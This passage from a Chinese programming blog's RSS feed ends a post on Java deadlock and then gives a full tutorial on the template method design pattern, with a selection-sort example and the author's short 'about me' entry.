e&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">printStackTrace&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;线程b尝试获取Integer.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#f92672">(&lt;/span>Integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;线程b获取到Integer.class&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">-----------------&lt;/span>
线程a尝试获取integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>
线程a获取到integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>
线程b尝试获取Integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>
线程b获取到Integer&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">class&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>在上面的例子中，由于已经不存在线程 a 持有线程 b 需要的锁，而线程 b 持有线程 a 需要的锁的逻辑了，所以 Demo 顺利执行完毕。&lt;/p>
&lt;section class="footnotes" role="doc-endnotes">
&lt;hr>
&lt;ol>
&lt;li id="fn:1" role="doc-endnote">
&lt;p>关于哲学家就餐问题详细请参考&lt;a href="https://zh.wikipedia.org/wiki/%E5%93%B2%E5%AD%A6%E5%AE%B6%E5%B0%B1%E9%A4%90%E9%97%AE%E9%A2%98">wiki&lt;/a>&amp;#160;&lt;a href="#fnref:1" class="footnote-backref" role="doc-backlink">&amp;#x21a9;&amp;#xfe0e;&lt;/a>&lt;/p>
&lt;/li>
&lt;/ol>
&lt;/section></description></item><item><title>模板方法设计模式</title><link>https://www.chucklin.net/post/template_designmode/</link><pubDate>Sat, 07 Jan 2017 10:56:57 +0800</pubDate><guid>https://www.chucklin.net/post/template_designmode/</guid><description>&lt;p>定义一个操作的主要逻辑方法，而将其他其他逻辑延迟到子类中实现，使子类可以在不改变主要逻辑结构的基础上，即可对某些特定逻辑进行重新实现的做法，叫做模板方法设计模式。&lt;/p>
&lt;h2 id="模板方法设计模式怎么用">模板方法设计模式怎么用？&lt;/h2>
&lt;p>试想一个业务场景。项目产生了一个代码排序后打印的需求。此需求被交付给了程序员 A 来实现。A 通过分析需求后发现要解决此问题需要 2 个步骤.&lt;/p>
&lt;ol>
&lt;li>排序数组&lt;/li>
&lt;li>打印排序后的数组&lt;/li>
&lt;/ol>
&lt;p>打印好做，而排序方法和规则较多，就比较麻烦了。于是 A 想到了一个办法，先把打印部分的代码做好，其他的交由其他程序员实现。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 模板方法设计模式
&lt;/span>&lt;span style="color:#75715e"> * 抽象类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">AbstractSort&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 将数组由大到小排序.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param array
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">abstract&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> array&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 打印排序好的数组.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param array
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">showSortResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> array&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>array&lt;span style="color:#f92672">);&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">print&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;排序结果：&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span> i &lt;span style="color:#f92672">&amp;lt;&lt;/span> array&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> i&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
System&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">printf&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#34;%3s&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> array&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>现在，A 已经做好了该需求主要框架部分的代码了。于是 A 通知到程序员 B，希望由 B 来负责实现剩下的逻辑。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 模板方法设计模式
&lt;/span>&lt;span style="color:#75715e"> * 排序具体实现类
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">ConcreteSort&lt;/span> &lt;span style="color:#66d9ef">extends&lt;/span> AbstractSort &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 排序方法
&lt;/span>&lt;span style="color:#75715e"> * 排序数组里每个元素的值.
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param array 数组
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#a6e22e">@Override&lt;/span>
&lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">sort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> array&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span> i &lt;span style="color:#f92672">&amp;lt;&lt;/span> array&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">length&lt;/span> &lt;span style="color:#f92672">-&lt;/span> 1&lt;span style="color:#f92672">;&lt;/span> i&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
selectSort&lt;span style="color:#f92672">(&lt;/span>array&lt;span style="color:#f92672">,&lt;/span> i&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 排序具体算法实现
&lt;/span>&lt;span style="color:#75715e"> * 遍历每个元素,找出相对于当前最小的元素的索引,然后调换互相的位置
&lt;/span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;span style="color:#75715e"> * @param array 数组
&lt;/span>&lt;span style="color:#75715e"> * @param index 索引
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">selectSort&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> array&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> index&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">int&lt;/span> MinValue &lt;span style="color:#f92672">=&lt;/span> 32767&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 最小值变量
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> indexMin &lt;span style="color:#f92672">=&lt;/span> 0&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 最小值索引变量
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> Temp&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// 暂存变量
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> index&lt;span style="color:#f92672">;&lt;/span> i &lt;span style="color:#f92672">&amp;lt;&lt;/span> array&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">length&lt;/span>&lt;span style="color:#f92672">;&lt;/span> i&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>array&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> MinValue&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span> &lt;span style="color:#75715e">// 找到最小值
&lt;/span>&lt;span style="color:#75715e">&lt;/span> MinValue &lt;span style="color:#f92672">=&lt;/span> array&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">];&lt;/span> &lt;span style="color:#75715e">// 储存最小值
&lt;/span>&lt;span style="color:#75715e">&lt;/span> indexMin &lt;span style="color:#f92672">=&lt;/span> i&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
Temp &lt;span style="color:#f92672">=&lt;/span> array&lt;span style="color:#f92672">[&lt;/span>index&lt;span style="color:#f92672">];&lt;/span> &lt;span style="color:#75715e">// 交换两数值
&lt;/span>&lt;span style="color:#75715e">&lt;/span> array&lt;span style="color:#f92672">[&lt;/span>index&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> array&lt;span style="color:#f92672">[&lt;/span>indexMin&lt;span style="color:#f92672">];&lt;/span>
array&lt;span style="color:#f92672">[&lt;/span>indexMin&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> Temp&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>程序员 B 实现了小-&amp;gt;大的排序逻辑，通知到 A 进行测试。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">
&lt;span style="color:#75715e">/**
&lt;/span>&lt;span style="color:#75715e"> * 模板方法设计模式
&lt;/span>&lt;span style="color:#75715e"> * 排序测试
&lt;/span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">Client&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> a &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">{&lt;/span>10&lt;span style="color:#f92672">,&lt;/span> 32&lt;span style="color:#f92672">,&lt;/span> 1&lt;span style="color:#f92672">};&lt;/span> &lt;span style="color:#75715e">// 预设数据数组
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>String&lt;span style="color:#f92672">[]&lt;/span> args&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
AbstractSort s &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ConcreteSort&lt;span style="color:#f92672">();&lt;/span>
s&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">showSortResult&lt;/span>&lt;span style="color:#f92672">(&lt;/span>a&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>排序结果： 1，10，32
这就是模板方法模式的主要用法。是不是很好理解？认识了模板方法的用法以后，再认识一下模板方法模式的结构，从理论上巩固一下该章节的知识。&lt;/p>
&lt;p>模板方法模式主要包含下面 3 个方法。&lt;/p>
&lt;ul>
&lt;li>模板方法&lt;/li>
&lt;li>抽象方法&lt;/li>
&lt;li>钩子方法&lt;/li>
&lt;/ul>
&lt;p>&lt;strong>模板方法&lt;/strong>
父类中只声明但不加以实现，而是定义好规范，然后由它的子类去实现。&lt;/p>
&lt;p>&lt;strong>抽象方法&lt;/strong>
由抽象类声明并加以实现。一般来说，模版方法调用抽象方法来完成主要的逻辑功能，并且，模版方法大多会定义为 final 类型，指明主要的逻辑功能在子类中不能被重写。&lt;/p>
&lt;p>&lt;strong>钩子方法&lt;/strong>
由抽象类声明并加以实现。但是子类可以去扩展，子类可以通过扩展钩子方法来影响模版方法的逻辑。
抽象类的任务是搭建逻辑的框架，通常由经验丰富的人员编写，因为抽象类的好坏直接决定了程序是否稳定性。实现类用来实现细节。抽象类中的模版方法正是通过实现类扩展的方法来完成业务逻辑。只要实现类中的扩展方法通过了单元测试，在模版方法正确的前提下，整体功能一般不会出现大的错误。&lt;/p>
&lt;h2 id="总结">总结&lt;/h2>
&lt;ol>
&lt;li>模板方法模式在项目中会经常运用到，需要熟练掌握。&lt;/li>
&lt;li>模板方法模式结构清晰。一般在项目中常常将不易于变化的部分封装为模板方法。而将易于变化的部分定义为抽象方法。&lt;/li>
&lt;li>模板方法模式易于扩展。面对新增需求，只需要增加相应的模板抽象方法实现子类就可以了，符合了接口的开闭原则。&lt;/li>
&lt;li>在多个子类拥有相同的方法，并且这些方法逻辑相同时，可以考虑使用模版方法模式。在程序的主框架相同，细节不同的场合下，也比较适合使用这种模式。&lt;/li>
&lt;/ol></description></item><item><title/><link>https://www.chucklin.net/about/me/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.chucklin.net/about/me/</guid><description>&lt;h3 id="hi-chuck-is-here-">Hi, Chuck is here 👋&lt;/h3>
&lt;p>&lt;!-- raw HTML omitted -->&lt;/p>
&lt;ul>
&lt;li>😊 很高兴见到你。&lt;/li>
&lt;li>👀 我正在寻找让大家变得幸福的方法。&lt;/li>
&lt;li>💡 爱好是阅读和写作。&lt;/li>
&lt;li>👉 &lt;a href="https://www.chucklin.net">了解我的作品&lt;/a>&lt;/li>
&lt;li>🤝 项目合作或雇佣我，通过邮件和我联系。&lt;/li>
&lt;li>❤️ Love and peace.&lt;/li>
&lt;/ul></description></item></channel></rss>